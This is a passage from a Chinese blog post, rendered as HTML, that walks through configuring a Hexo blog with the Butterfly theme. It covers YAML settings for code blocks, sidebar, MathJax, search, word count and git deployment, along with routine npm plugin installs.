class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></p><p>  接着，修改<strong>working_dir/themes/butterfly/_config.yml</strong>中如下值，将代码主题设置为mac主题，其余皆为默认设置，使代码更加美观</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Code Blocks (代碼相關)</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">highlight_theme:</span> <span class="string">mac</span> <span class="comment">#  darker / pale night / light / ocean / mac / mac light / false</span></span><br><span class="line"><span class="attr">highlight_copy:</span> <span class="literal">true</span> <span class="comment"># copy button</span></span><br><span class="line"><span class="attr">highlight_lang:</span> <span class="literal">true</span> <span class="comment"># show the code language</span></span><br><span class="line"><span class="attr">highlight_shrink:</span> <span class="literal">false</span> <span class="comment"># true: shrink the code blocks / false: expand the code blocks | none: expand code blocks and hide the button</span></span><br><span class="line"><span class="attr">highlight_height_limit:</span> <span class="literal">false</span> <span class="comment"># unit: px</span></span><br><span class="line"><span class="attr">code_word_wrap:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="设置文章meta显示"><a href="#设置文章meta显示" class="headerlink" title="设置文章meta显示"></a>设置文章meta显示</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">page:</span> <span class="comment"># Home Page</span></span><br><span class="line">    <span class="attr">date_type:</span> <span class="string">created</span> <span class="comment"># created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span></span><br><span class="line">    <span class="attr">date_format:</span> <span class="string">date</span> <span class="comment"># date/relative 顯示日期還是相對日期</span></span><br><span class="line">    <span class="attr">categories:</span> <span class="literal">true</span> <span class="comment"># true or false 主頁是否顯示分類</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="literal">true</span> <span class="comment"># true or false 主頁是否顯示標籤</span></span><br><span class="line">    <span class="attr">label:</span> <span class="literal">true</span> <span class="comment"># true or false 顯示描述性文字</span></span><br><span class="line">  <span class="attr">post:</span></span><br><span class="line">    <span class="attr">date_type:</span> <span class="string">both</span> <span class="comment"># created or updated or both 文章頁日期是創建日或者更新日或都顯示</span></span><br><span class="line">    <span class="attr">date_format:</span> <span class="string">date</span> <span class="comment"># date/relative 顯示日期還是相對日期</span></span><br><span class="line">    <span class="attr">categories:</span> <span class="literal">true</span> <span class="comment"># true or false 文章頁是否顯示分類</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="literal">true</span> <span class="comment"># true or false 文章頁是否顯示標籤</span></span><br><span class="line">    <span class="attr">label:</span> <span class="literal">true</span> <span class="comment"># true or false 顯示描述性文字</span></span><br></pre></td></tr></table></figure><p>  这里设置主页中文件显示标签信息，更方便获取文章信息</p><h4 id="设置文章版权"><a href="#设置文章版权" class="headerlink" title="设置文章版权"></a>设置文章版权</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_copyright:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">decode:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">CC</span> <span class="string">BY-NC-SA</span> <span class="number">4.0</span></span><br><span class="line">  <span class="attr">license_url:</span> <span class="string">https://creativecommons.org/licenses/by-nc-sa/4.0/</span></span><br></pre></td></tr></table></figure><p>  这里对于文章版权和许可协议，将其网址解码功能打开，从而正常显示中文网站</p><h4 id="设置文章锚点"><a href="#设置文章锚点" class="headerlink" title="设置文章锚点"></a>设置文章锚点</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># anchor</span></span><br><span class="line"><span class="comment"># when you scroll in post, the URL will update according to header id.</span></span><br><span class="line"><span class="attr">anchor:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>  即开启文章锚点功能，从而每次翻动文章时，其URL都会进行相应的更改，其会在网页中留下历史记录。</p><h4 id="设置文章分页按钮"><a href="#设置文章分页按钮" class="headerlink" title="设置文章分页按钮"></a>设置文章分页按钮</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># post_pagination (分頁)</span></span><br><span class="line"><span class="comment"># value: 1 || 2 || false</span></span><br><span class="line"><span class="comment"># 1: The &#x27;next post&#x27; will link to old post</span></span><br><span class="line"><span class="comment"># 2: The &#x27;next post&#x27; will link to new post</span></span><br><span class="line"><span class="comment"># false: disable pagination</span></span><br><span class="line"><span class="attr">post_pagination:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>  通过开启文章分页按钮，并设置为模式2，文章结束处会显示上一篇和下一篇文章的跳转信息</p><h4 id="设置账户头像"><a href="#设置账户头像" class="headerlink" title="设置账户头像"></a>设置账户头像</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Avatar (頭像)</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">img:</span> <span class="string">/img/profile.jpg</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>  这里通过设置img的路径信息即可。这里的根目录为<strong>working_dir/themes/butterfly/source</strong>，将头像放置在该位置即可。</p><h4 id="设置博客Footer"><a href="#设置博客Footer" class="headerlink" title="设置博客Footer"></a>设置博客Footer</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Footer Settings</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">owner:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">since:</span> <span class="number">2021</span></span><br><span class="line">  <span class="attr">custom_text:</span> <span class="string">&quot;Come to pwn me!!&quot;</span></span><br><span class="line">  <span class="attr">copyright:</span> <span class="literal">false</span> <span class="comment"># Copyright of theme and framework</span></span><br></pre></td></tr></table></figure><p>  这里设置了博客角标的显示信息，关闭了copyright内容，并加入了自己的自定义信息</p><h4 id="右下角按钮"><a href="#右下角按钮" class="headerlink" title="右下角按钮"></a>右下角按钮</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Change font size</span></span><br><span class="line"><span class="attr">change_font_size:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Conversion between Traditional and Simplified Chinese (簡繁轉換)</span></span><br><span class="line"><span class="attr">translate:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># The text of a button</span></span><br><span class="line">  <span class="attr">default:</span> <span class="string">繁</span></span><br><span class="line">  <span class="comment"># the language of website (1 - Traditional Chinese/ 2 - Simplified Chinese）</span></span><br><span class="line">  <span class="attr">defaultEncoding:</span> <span class="number">2</span></span><br><span class="line">  <span class="comment"># Time delay</span></span><br><span class="line">  <span class="attr">translateDelay:</span> <span class="number">0</span></span><br><span class="line">  <span class="comment"># The text of the button when the language is Simplified Chinese</span></span><br><span class="line">  <span class="attr">msgToTraditionalChinese:</span> <span class="string">&#x27;繁&#x27;</span></span><br><span class="line">  <span class="comment"># The text of the button when the language is Traditional Chinese</span></span><br><span class="line">  <span class="attr">msgToSimplifiedChinese:</span> <span class="string">&#x27;簡&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Read Mode (閲讀模式)</span></span><br><span class="line"><span class="attr">readmode:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dark mode</span></span><br><span class="line"><span class="attr">darkmode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Toggle Button to switch dark/light mode</span></span><br><span class="line">  <span class="attr">button:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Switch dark/light mode automatically (自動切換 dark mode和 light mode)</span></span><br><span class="line">  <span class="comment"># autoChangeMode: 1  Following System Settings, if the system doesn&#x27;t support dark mode, it will switch dark mode between 6 pm to 6 am</span></span><br><span class="line">  <span class="comment"># autoChangeMode: 2  Switch dark mode between 6 pm to 6 am</span></span><br><span class="line">  <span class="comment"># autoChangeMode: false</span></span><br><span class="line">  <span class="attr">autoChangeMode:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lightbox (圖片大圖查看模式)</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"><span class="comment"># You can only choose one, or neither (只能選擇一個 或者 兩個都不選)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># medium-zoom</span></span><br><span class="line"><span class="comment"># https://github.com/francoischalifour/medium-zoom</span></span><br><span class="line"><span class="attr">medium_zoom:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fancybox</span></span><br><span class="line"><span class="comment"># http://fancyapps.com/fancybox/3/</span></span><br><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>  这里关闭了简繁转换、阅读模式和夜间模式等按钮</p><h4 id="设置侧边栏"><a href="#设置侧边栏" class="headerlink" title="设置侧边栏"></a>设置侧边栏</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># aside (側邊欄)</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hide:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">button:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">true</span> <span class="comment"># display on mobile</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span> <span class="comment"># left or right</span></span><br><span class="line">  <span class="attr">card_author:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">description:</span> <span class="string">&quot;coder &amp;&amp; ctfer&quot;</span></span><br><span class="line">    <span class="attr">button:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">icon:</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">      <span class="attr">text:</span> <span class="string">Follow</span> <span class="string">Me</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://gitee.com/jiaweihawk</span></span><br><span class="line">  <span class="attr">card_announcement:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">&quot;This is hawk&#x27;s blog&quot;</span></span><br><span class="line">  <span class="attr">card_recent_post:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">5</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">sort:</span> <span class="string">date</span> <span class="comment"># date or updated</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_categories:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">8</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">expand:</span> <span class="literal">false</span> <span class="comment"># none/true/false</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_tags:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">40</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">color:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_archives:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">monthly</span> <span class="comment"># yearly or monthly</span></span><br><span class="line">    <span class="attr">format:</span> <span class="string">MMMM</span> <span class="string">YYYY</span> <span class="comment"># eg: YYYY年MM月</span></span><br><span class="line">    <span class="attr">order:</span> <span class="number">-1</span> <span class="comment"># Sort of order. 1, asc for ascending; -1, desc for descending</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">8</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_webinfo:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">post_count:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">last_push_date:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># busuanzi count for PV / UV in site</span></span><br><span class="line"><span class="comment"># 訪問人數</span></span><br><span class="line"><span class="attr">busuanzi:</span></span><br><span class="line">  <span class="attr">site_uv:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">site_pv:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">page_pv:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time difference between publish date and now (網頁運行時間)</span></span><br><span class="line"><span class="comment"># Formal: Month/Day/Year Time or Year/Month/Day Time</span></span><br><span class="line"><span class="attr">runtimeshow:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">publish_date:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Aside widget - Newest Comments</span></span><br><span class="line"><span class="attr">newest_comments:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">6</span></span><br><span class="line">  <span class="attr">storage:</span> <span class="number">10</span> <span class="comment"># unit: mins, save data to localStorage</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># You can only choose one, or neither</span></span><br><span class="line">  <span class="attr">valine:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">github_issues:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">repo:</span></span><br><span class="line">  <span class="attr">disqus:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">forum:</span></span><br><span class="line">    <span class="attr">api_key:</span></span><br><span class="line">  <span class="attr">twikoo:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">waline:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>  这里关闭了隐藏主页的按钮，修改了主页的个人信息部分的设置，并且关闭了公告和网站信卡片，并关闭了诸如访问人数、运行时间和最新评论的无关信息。</p><h4 id="设置数学支持"><a href="#设置数学支持" class="headerlink" title="设置数学支持"></a>设置数学支持</h4><p>数学公式支持依赖第三方库，因此在 <strong>working_dir</strong>工作目录下执行如下命令，安装该依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p><p>然后修改<strong>working_dir/themes/butterfly/_config.yml</strong>中的设置信息<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mathjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># true 表示每一页都加载mathjax.js</span></span><br><span class="line">  <span class="comment"># false 需要时加载，须在使用的Markdown Front-matter 加上 mathjax: true</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>最后，还需要修改 <strong>working_dir/_config.yml</strong>中的设置信息<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MathJax</span></span><br><span class="line"><span class="attr">kramed:</span></span><br><span class="line">  <span class="attr">gfm:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">pedantic:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">sanitize:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tables:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">breaks:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartLists:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartypants:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>这里尝试使用如下语句测试其数学公式引用效果<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里引用变量<span class="code">`$a_i$`</span></span><br><span class="line">$$\sigma = x<span class="emphasis">_1 + y_</span>1$$</span><br></pre></td></tr></table></figure></p><p>结果如下所示</p><blockquote><p>这里引用变量<script type="math/tex">a_i</script></p><script type="math/tex; mode=display">\sigma = x_1 + y_1</script></blockquote><h4 id="设置置顶系统"><a href="#设置置顶系统" class="headerlink" title="设置置顶系统"></a>设置置顶系统</h4><p>  置顶系统依赖第三方库，因此在<strong>working_dir</strong>工作目录下执行如下命令，安装该依赖<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-index --save</span><br></pre></td></tr></table></figure></p><p>  这里通过修改<strong>working_dir/_config.yml</strong>，完成置顶系统的设置，如下所示<br>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Home page setting</span></span><br><span class="line"><span class="comment"># path: Root path for your blogs index page. (default = &#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># per_page: Posts displayed per page. (0 = disable pagination)</span></span><br><span class="line"><span class="comment"># order_by: Posts order. (Order by date descending by default)</span></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">6</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span></span><br><span class="line">  <span class="attr">pagination_dir:</span> <span class="string">page</span></span><br></pre></td></tr></table></figure></p><p>  之后，如果需要置顶一篇博客，则在博客的<strong>Front-matter</strong>区域添加<strong>sticky</strong>字段即可——其值越大，对应的博客会被放在越前面，如下所示<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line"><span class="section">sticky: 100</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure></p><h4 id="设置搜索系统"><a href="#设置搜索系统" class="headerlink" title="设置搜索系统"></a>设置搜索系统</h4><p>  本地搜索依赖第三方库，因此在<strong>working_dir</strong>工作目录下执行如下命令，安装该依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>  直接修改博客中的主题设置，打开本地搜索</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="设置页面资源引用"><a href="#设置页面资源引用" class="headerlink" title="设置页面资源引用"></a>设置页面资源引用</h4><p>  修改博客中的相关设置，打开相对引用功能</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>  之后，我们在README中使用如下语句测试其图片引用和文件引用的效果<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">background</span>](<span class="link">background.jpg</span>)</span><br><span class="line">[<span class="string">background</span>](<span class="link">background.jpg</span>)</span><br></pre></td></tr></table></figure></p><p>  则其会引用<strong>working_dir/source/_posts/<code>filename</code>/background.jpg</strong>的资源，效果如下图所示<br>  <img src="background.jpg" alt="效果图"><br>  <a href="background.jpg">文件链接</a></p><h4 id="设置页面美化"><a href="#设置页面美化" class="headerlink" title="设置页面美化"></a>设置页面美化</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Beautify (美化頁面顯示)</span></span><br><span class="line"><span class="attr">beautify:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># site/post</span></span><br><span class="line">  <span class="attr">title-prefix-icon:</span> <span class="string">&#x27;\f024&#x27;</span></span><br><span class="line">  <span class="attr">title-prefix-icon-color:</span> <span class="string">&#x27;#F47466&#x27;</span></span><br></pre></td></tr></table></figure><p>  这里开启页面美化，自动更改<strong>ol</strong>、<strong>ul</strong>和<strong>h1</strong>-<strong>h5</strong>的样式</p><h4 id="设置页面字体"><a href="#设置页面字体" class="headerlink" title="设置页面字体"></a>设置页面字体</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Global font settings</span></span><br><span class="line"><span class="comment"># Don&#x27;t modify the following settings unless you know how they work (非必要不要修改)</span></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">global-font-size:</span> <span class="string">13pt</span></span><br><span class="line">  <span class="attr">code-font-size:</span> <span class="string">11pt</span></span><br><span class="line">  <span class="attr">font-family:</span></span><br><span class="line">  <span class="attr">code-font-family:</span></span><br></pre></td></tr></table></figure><p>  这里修改了全局页面字体的大小设置</p><h4 id="设置字数统计"><a href="#设置字数统计" class="headerlink" title="设置字数统计"></a>设置字数统计</h4><p>  文章字数统计依赖第三方库，因此在<strong>working_dir</strong>工作目录下执行如下命令，安装该依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>  直接修改博客中的主题设置，打开文章统计，并且关闭网站总字数统计即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wordcount (字數統計)</span></span><br><span class="line"><span class="attr">wordcount:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_wordcount:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">min2read:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_wordcount:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="设置博客部署配置"><a href="#设置博客部署配置" class="headerlink" title="设置博客部署配置"></a>设置博客部署配置</h2><p>  博客部署同样依赖第三方库，因此在<strong>working_dir</strong>工作目录下执行如下命令，安装该依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>  然后，修改<strong>working_dir/_config.yml</strong>中的deploy配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@gitee.com:jiaweihawk/jiaweihawk.git</span> </span><br><span class="line">  <span class="attr">branch:</span> <span class="string">&quot;deploy&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  